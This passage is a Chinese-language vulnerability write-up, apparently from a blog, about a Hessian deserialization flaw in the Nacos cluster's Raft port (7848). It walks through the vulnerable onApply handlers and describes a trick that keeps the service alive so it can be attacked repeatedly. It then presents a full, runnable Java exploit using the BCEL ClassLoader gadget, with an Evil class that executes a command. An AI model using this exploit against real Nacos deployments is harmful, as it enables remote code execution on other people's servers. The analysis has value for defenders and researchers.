class="hljs-keyword">final</span> <span class="hljs-type">Lock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> readLock;<br>    lock.lock();<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">switch</span> (operation) &#123;<br>            <span class="hljs-keyword">case</span> ADD:<br>                onInstanceRegister(instanceRequest.service, instanceRequest.instance,<br>                        instanceRequest.getClientId());<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> DELETE:<br>                onInstanceDeregister(instanceRequest.service, instanceRequest.getClientId());<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> CHANGE:<br>                <span class="hljs-keyword">if</span> (instanceAndServiceExist(instanceRequest)) &#123;<br>                    onInstanceRegister(instanceRequest.service, instanceRequest.instance,<br>                            instanceRequest.getClientId());<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">return</span> Response.newBuilder().setSuccess(<span class="hljs-literal">false</span>).setErrMsg(<span class="hljs-string">&quot;unsupport operation : &quot;</span> + operation)<br>                        .build();<br>        &#125;<br>    	&#125;<br>        <span class="hljs-keyword">return</span> Response.newBuilder().setSuccess(<span class="hljs-literal">true</span>).build();<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        lock.unlock();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//	public static final NAMING_PERSISTENT_SERVICE_GROUP_V2 = &quot;naming_persistent_service_v2&quot;;</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">group</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">//NAMING_PERSISTENT_SERVICE_GROUP_V2 = &quot;naming_persistent_service_v2&quot;;</span><br>    <span class="hljs-keyword">return</span> Constants.NAMING_PERSISTENT_SERVICE_GROUP_V2;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p> com.alibaba.nacos.naming.core.v2.metadata.InstanceMetadataProcessor#onApply()</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Response <span class="hljs-title function_">onApply</span><span class="hljs-params">(WriteRequest request)</span> &#123;<br>	<span class="hljs-comment">////此处调用至 HessianSerializer#deserialize() 方法，存在Hessian反序列化漏洞</span><br>	<span class="hljs-comment">//此处接收类为 MetadataOperation&lt;InstanceMetadata&gt;，若反序列化类不为 InstanceStoreRequest 则报错，导致服务异常</span><br>	<span class="hljs-comment">//State为State.STATE_ERROR 导致AbstractProcessor#handleRequest() 不继续执行至 execute() 此漏洞无法再次利用</span><br>    MetadataOperation&lt;InstanceMetadata&gt; op = serializer.deserialize(request.getData().toByteArray(), processType);<br>    readLock.lock();<br>    <span class="hljs-keyword">try</span> &#123;<br>    	....<br>        &#125;<br>        <span class="hljs-keyword">return</span> Response.newBuilder().setSuccess(<span class="hljs-literal">true</span>).build();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        Loggers.RAFT.error(<span class="hljs-string">&quot;onApply &#123;&#125; instance metadata operation failed. &quot;</span>, request.getOperation(), e);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">errorMessage</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span> == e.getMessage() ? e.getClass().getName() : e.getMessage();<br>        <span class="hljs-keyword">return</span> Response.newBuilder().setSuccess(<span class="hljs-literal">false</span>).setErrMsg(errorMessage).build();<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        readLock.unlock();<br>    &#125;<br>&#125;<br>    <br><span class="hljs-comment">//    public static final String INSTANCE_METADATA = &quot;naming_instance_metadata&quot;;</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">group</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> Constants.SERVICE_METADATA;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p> com.alibaba.nacos.naming.core.v2.metadata.ServiceMetadataProcessor#onApply()</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Response <span class="hljs-title function_">onApply</span><span class="hljs-params">(WriteRequest request)</span> &#123;<br>	<span class="hljs-comment">//此处调用至 HessianSerializer#deserialize() 方法，存在Hessian反序列化漏洞</span><br>	<span class="hljs-comment">//此处接收类为 MetadataOperation&lt;ServiceMetadata&gt;，若反序列化类不为 InstanceStoreRequest 则报错，导致服务异常</span><br>	<span class="hljs-comment">//State为State.STATE_ERROR 导致AbstractProcessor#handleRequest() 不继续执行至 execute() 此漏洞无法再次利用</span><br>    MetadataOperation&lt;ServiceMetadata&gt; op = serializer.deserialize(request.getData().toByteArray(), processType);<br>    readLock.lock();<br>    <span class="hljs-keyword">try</span> &#123;<br>    	...<br>        &#125;<br>        <span class="hljs-keyword">return</span> Response.newBuilder().setSuccess(<span class="hljs-literal">true</span>).build();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        Loggers.RAFT.error(<span class="hljs-string">&quot;onApply &#123;&#125; service metadata operation failed. &quot;</span>, request.getOperation(), e);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">errorMessage</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span> == e.getMessage() ? e.getClass().getName() : e.getMessage();<br>        <span class="hljs-keyword">return</span> Response.newBuilder().setSuccess(<span class="hljs-literal">false</span>).setErrMsg(errorMessage).build();<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        readLock.unlock();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//    public static final String SERVICE_METADATA = &quot;naming_service_metadata&quot;;</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">group</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> Constants.INSTANCE_METADATA;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>MetadataOperation 存在属性 metadata  为泛型，可以构造一个 MetadataOperation 对象，并在其 metadata 属性设置恶意对象，此时反序列化后的对象符合预期，不会报错，服务继续运行，可多次攻击。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MetadataOperation</span>&lt;T&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> -<span class="hljs-number">111405695252896706L</span>;<br><br>    <span class="hljs-keyword">private</span> String namespace;<br><br>    <span class="hljs-keyword">private</span> String group;<br><br>    <span class="hljs-keyword">private</span> String serviceName;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * If the metadata is cluster or instance, the tag should be added with the identity of cluster or instance.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> String tag;<br><br>    <span class="hljs-keyword">private</span> T metadata;<br><br>	...<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="利用总结"><a href="#利用总结" class="headerlink" title="利用总结"></a>利用总结</h3><ol>
+<li>攻击端口默认为7848</li>
+<li>为Hessian 反序列化链攻击</li>
+<li>存在三个攻击链</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">naming_persistent_service_v2  ----  PersistentClientOperationServiceImpl<br>naming_instance_metadata  ----  InstanceMetadataProcessor  <br>naming_service_metadata  ----   ServiceMetadataProcessor    <br></code></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>PersistentClientOperationServiceImpl  要求反序列化类为 InstanceStoreRequest</li>
+<li>InstanceMetadataProcessor 要求反序列化类为 MetadataOperation<InstanceMetadata></li>
+<li>ServiceMetadataProcessor 要求反序列化类为 MetadataOperation<ServiceMetadata></li>
+<li>MetadataOperation 存在泛型属性 metadata，可设置其为恶意对象进行攻击，不影响服务运行，可多次攻击</li>
+</ol>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>此漏洞利用为Hessian 反序列化，可使用多个Hessian 反序列化 Gadget ，以下payload使用 BCEL ClassLoader Gadget。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.nacos.consistency.entity.WriteRequest;<br><span class="hljs-keyword">import</span> com.alibaba.nacos.naming.core.v2.metadata.InstanceMetadata;<br><span class="hljs-keyword">import</span> com.alibaba.nacos.naming.core.v2.metadata.MetadataOperation;<br><span class="hljs-keyword">import</span> com.alibaba.nacos.naming.core.v2.metadata.ServiceMetadata;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.option.CliOptions;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.rpc.RpcClient;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.rpc.impl.MarshallerHelper;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.rpc.impl.cli.CliClientServiceImpl;<br><span class="hljs-keyword">import</span> com.alipay.sofa.jraft.util.Endpoint;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.google.protobuf.ByteString;<br><span class="hljs-keyword">import</span> com.google.protobuf.Message;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><span class="hljs-keyword">import</span> sun.swing.SwingLazyValue;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NacosExplit</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">CliClientServiceImpl</span> <span class="hljs-variable">cliClientService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CliClientServiceImpl</span>();<br>        cliClientService.init(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CliOptions</span>());<br>        setProperties(cliClientService.getRpcClient());<br><br>        MetadataOperation&lt;ServiceMetadata&gt; metadataOperation = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MetadataOperation</span>&lt;ServiceMetadata&gt;();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">metadataField</span> <span class="hljs-operator">=</span> metadataOperation.getClass().getDeclaredField(<span class="hljs-string">&quot;metadata&quot;</span>);<br>        metadataField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//此处BCEL_ClassLoader() 可更换为其他 Gadget</span><br>        metadataField.set(metadataOperation,BCEL_ClassLoader());<br>        WriteRequest.<span class="hljs-type">Builder</span> <span class="hljs-variable">writeRequestBuilder</span> <span class="hljs-operator">=</span> WriteRequest.newBuilder().setGroup(<span class="hljs-string">&quot;naming_service_metadata&quot;</span>).setData(serialize(metadataOperation));<br><br>        <span class="hljs-comment">//二选一均可以攻击</span><br><span class="hljs-comment">//        MetadataOperation&lt;InstanceMetadata&gt; metadataOperation = new MetadataOperation&lt;InstanceMetadata&gt;();</span><br><span class="hljs-comment">//        Field metadataField = metadataOperation.getClass().getDeclaredField(&quot;metadata&quot;);</span><br><span class="hljs-comment">//        metadataField.setAccessible(true);</span><br><span class="hljs-comment">//        metadataField.set(metadataOperation,BCEL_ClassLoader());</span><br><span class="hljs-comment">//        WriteRequest.Builder writeRequestBuilder = WriteRequest.newBuilder().setGroup(&quot;naming_instance_metadata&quot;).setData(serialize(metadataOperation));</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> cliClientService.getRpcClient().invokeSync(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Endpoint</span>(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">7848</span>), writeRequestBuilder.build(), <span class="hljs-number">10000</span>);<br>        System.out.println(o);<br>    &#125;<br><br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setProperties</span><span class="hljs-params">(RpcClient rpcClient)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">parserClasses</span> <span class="hljs-operator">=</span> rpcClient.getClass().getDeclaredField(<span class="hljs-string">&quot;parserClasses&quot;</span>);<br>        parserClasses.setAccessible(<span class="hljs-literal">true</span>);<br>        Map&lt;String, Message&gt; map = (Map&lt;String, Message&gt;) parserClasses.get(rpcClient);<br>        map.put(<span class="hljs-string">&quot;com.alibaba.nacos.consistency.entity.WriteRequest&quot;</span>, WriteRequest.getDefaultInstance());<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">messages</span> <span class="hljs-operator">=</span> MarshallerHelper.class.getDeclaredField(<span class="hljs-string">&quot;messages&quot;</span>);<br>        messages.setAccessible(<span class="hljs-literal">true</span>);<br>        Map&lt;String, Message&gt; messageMap = (Map&lt;String, Message&gt;) messages.get(MarshallerHelper.class);<br>        messageMap.put(<span class="hljs-string">&quot;com.alibaba.nacos.consistency.entity.WriteRequest&quot;</span>, WriteRequest.getDefaultInstance());<br>	&#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ByteString <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(bos);<br>        out.getSerializerFactory().setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        out.writeObject(o);<br>        out.close();<br><br>        <span class="hljs-keyword">return</span> ByteString.copyFrom(bos.toByteArray());<br>    &#125;<br><br>    <span class="hljs-comment">//BCEL ClassLoader Gadget</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">BCEL_ClassLoader</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Repository.lookupClass(Evil.class);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;$$BCEL$$&quot;</span> + Utility.encode(clazz.getBytes(), <span class="hljs-literal">true</span>);<br>        <span class="hljs-type">SwingLazyValue</span> <span class="hljs-variable">swingLazyValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">SwingLazyValue</span>(<span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper&quot;</span>,<span class="hljs-string">&quot;_main&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]<br>                &#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;payload&#125;&#125;);<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">u1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        <span class="hljs-type">UIDefaults</span> <span class="hljs-variable">u2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UIDefaults</span>();<br>        u1.put(<span class="hljs-string">&quot;aaa&quot;</span>, swingLazyValue);<br>        u2.put(<span class="hljs-string">&quot;aaa&quot;</span>, swingLazyValue);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(u1,u1);<br>        map.put(u2,u2);<br>        <span class="hljs-keyword">return</span> map;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>Evil</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">_main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="print-no-link">#漏洞分析</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Nacos 内网集群 Raft 反序列化漏洞</div>
+      <div>http://example.com/2023/06/19/Nacos-内网集群-Raft-反序列化漏洞/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年6月19日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/09/02/SSTI-Freemarker%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" title="SSTI-Freemarker模板注入漏洞">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SSTI-Freemarker模板注入漏洞</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/04/24/Kafka%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%80/" title="Kafka命令执行漏洞一">
+                        <span class="hidden-mobile">Kafka命令执行漏洞一</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
